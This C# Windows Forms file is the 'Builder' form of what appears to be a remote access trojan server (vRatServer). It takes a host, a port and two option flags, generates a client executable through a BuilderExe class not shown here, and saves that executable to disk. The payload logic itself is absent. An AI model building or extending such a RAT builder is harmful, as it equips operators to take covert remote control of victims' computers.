using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new BuilderExe(textBox1.Text,(ushort)numericUpDown1.Value,checkBox1.Checked,checkBox2.Checked);
            DialogResult d= saveFileDialog1.ShowDialog();
            if (d == DialogResult.OK)
            {
                File.WriteAllBytes(saveFileDialog1.FileName, Exe.rawData);
                MessageBox.Show("File Saved "+ saveFileDialog1.FileName,"Saved!",MessageBoxButtons.OK,MessageBoxIcon.Information);
            }


        }
    }
}
